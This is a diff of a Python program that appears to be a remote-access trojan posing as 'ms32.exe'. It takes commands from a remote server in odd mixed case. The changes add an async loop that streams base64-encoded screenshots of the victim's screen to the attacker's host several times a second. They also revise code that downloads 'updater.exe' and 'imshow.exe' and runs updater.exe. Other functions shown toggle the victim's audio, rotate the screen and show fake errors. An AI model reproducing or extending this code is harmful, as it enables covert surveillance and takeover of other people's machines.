@@ -10,8 +10,11 @@ from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from shutil import rmtree
 import rotatescreen as rs
 from pyautogui import screenshot
-from io import BytesIO 
-
+import base64
+from io import BytesIO
+import time 
+import httpx
+import asyncio
 url = "https://ms32-sha2.onrender.com/"
 screen = rs.get_primary_display()
 terminate = False
@@ -76,7 +79,7 @@ def playfunc(fp):
         # try:                
         CoInitialize()
         devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume.iid, CLSCTX_ALL, None)
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
         volume = interface.QueryInterface(IAudioEndpointVolume)
         
         if volume.GetMute():
@@ -114,18 +117,19 @@ def update():
                 if chunk:
                     file.write(chunk)
                     downloaded_size += len(chunk)
-        exe = hit(url+"static/updates/updater.exe")
-        try:
-            kp = type(exe.content.decode("utf-8"))
-            log(f"Likely error. recieved content for updater.exe is {kp}")
-        except Exception as e:
-            log(f"DOwnloaded updater.exe")
-        with open("updater.exe", "wb") as file:
-            downloaded_size = 0
-            for chunk in exe.iter_content(chunk_size=8192):
-                if chunk:
-                    file.write(chunk)
-                    downloaded_size += len(chunk)
+        if not os.path.exists("updater.exe"):
+            exe = hit(url+"static/updates/updater.exe")
+            try:
+                kp = type(exe.content.decode("utf-8"))
+                log(f"Likely error. recieved content for updater.exe is {kp}")
+            except Exception as e:
+                log(f"DOwnloaded updater.exe")
+            with open("updater.exe", "wb") as file:
+                downloaded_size = 0
+                for chunk in exe.iter_content(chunk_size=8192):
+                    if chunk:
+                        file.write(chunk)
+                        downloaded_size += len(chunk)
         os.startfile("updater.exe")
         log("Updating ms32.exe")
         terminate=True
@@ -235,7 +239,7 @@ def display(fp:str):
                 if chunk:
                     file.write(chunk)
                     downloaded_size += len(chunk)
-        try:
+        if not os.path.exists("imshow.exe"):
             exe = hit(url+f"static/apps/imshow.exe")
             try:
                 kp = type(exe.content.decode("utf-8"))
@@ -243,19 +247,6 @@ def display(fp:str):
             except Exception as e:
                 log(f"DOwnloaded imshow.exe")
             with open("imshow.exe", "xb") as file:
-                downloaded_size = 0
-                for chunk in exe.iter_content(chunk_size=8192):
-                    if chunk:
-                        file.write(chunk)
-                        downloaded_size += len(chunk)
-        except FileExistsError:
-            exe = hit(url+f"static/apps/imshow.exe")
-            try:
-                kp = type(exe.content.decode("utf-8"))
-                log(f"Likely error. recieved content for imshow.exe is {kp}")
-            except Exception as e:
-                log(f"DOwnloaded imshow.exe")
-            with open("imshow.exe", "wb") as file:
                 downloaded_size = 0
                 for chunk in exe.iter_content(chunk_size=8192):
                     if chunk:
@@ -307,20 +298,38 @@ def showerr(num):
     except Exception as e:
         log(f"showerr thread error:\t{e}",state="WARN")
 
-def share():
+async def share():
     global sharing
-    while sharing:
-        try:
-            print("inside")
-            ss = screenshot() # Resize to 800x450
-            img_byte_arr = BytesIO()
-            ss.save(img_byte_arr, format='JPEG')  # Lower quality
-            img_byte_arr = img_byte_arr.getvalue()
-            files = {'image': ('screenshot.jpg', img_byte_arr, 'image/jpeg')}
-            rq.post(url+"screenshot", files=files)
-            sleep(0.08)
-        except Exception as e:
-            log(f"share thread error:\t{e}",state="WARN")
+    async with httpx.AsyncClient() as client:
+        while sharing:
+            start_time = time.time()  # Measure time for FPS
+
+            # Step 1: Capture Screenshot
+            ss = screenshot()
+            ss = ss.resize((ss.width//2,ss.height//2))
+            # Step 2: Optimize Screenshot (Save as JPEG in-memory)
+            buffer = BytesIO()
+            ss.save(buffer, format="JPEG")  # Lower quality for speed
+            base64_string = base64.b64encode(buffer.getvalue()).decode("utf-8")
+
+            # Step 3: JSON Payload
+            json_payload = {"image": base64_string}
+
+            # Step 4: Send Async Request
+            try:
+                response = await client.post(url+"screenshot", json=json_payload, timeout=1.5)
+                # print("Status:", response.status_code)
+            except httpx.RequestError as e:
+                print("Request failed:", e)
+
+            # Step 5: Control FPS (~5 FPS)
+            elapsed_time = time.time() - start_time
+            fps = 1 / elapsed_time if elapsed_time > 0 else 0
+            print(f"FPS: {fps:.2f}")
+            fps_delay = max(0, 1/5 - elapsed_time)  # Maintain ~5 FPS
+            await asyncio.sleep(fps_delay)
+def async_runner():
+    asyncio.run(share())
 def main():
     global sstate
     global sharing
@@ -374,7 +383,7 @@ def main():
                 Thread(target=showerr,args=(cmd,)).start()
             elif "sHaRe on" in cmd:
                 sharing = True
-                Thread(target=share).start()
+                Thread(target=async_runner).start()
             elif "sHaRe off" in cmd:
                 sharing = False
             elif "sPeAk" in cmd:
